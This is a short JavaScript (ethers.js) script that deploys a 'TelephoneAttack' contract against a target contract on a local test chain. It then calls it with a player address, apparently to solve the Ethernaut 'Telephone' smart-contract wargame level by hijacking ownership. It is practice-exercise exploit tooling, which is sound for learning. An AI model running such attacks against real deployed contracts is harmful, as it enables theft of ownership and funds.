const { ethers } =  require("ethers"); 
const fs = require('fs');

const url = "http://localhost:8545";

const provider = new ethers.providers.JsonRpcProvider(url);

// Getting the accounts
const signer = provider.getSigner(19);

contract_address = "0x856e4424f806D16E8CBC702B3c0F2ede5468eae5"
player_address = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

telephoneABI = []
const metadata = JSON.parse(fs.readFileSync('../artifacts/contracts/TelephoneAttack.sol/TelephoneAttack.json').toString())

telephoneContract = new ethers.Contract(contract_address, telephoneABI, signer)
telephoneAttackContractFactory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer)


;(async () => {
    price = ethers.utils.formatUnits(await provider.getGasPrice(), 'gwei')
    options = {gasLimit: 1000000, gasPrice: ethers.utils.parseUnits(price, 'gwei')}

    telephoneAttackContract = await telephoneAttackContractFactory.deploy(contract_address, options)
    await telephoneAttackContract.deployTransaction.wait()
    await telephoneAttackContract.sendTx(player_address)
})();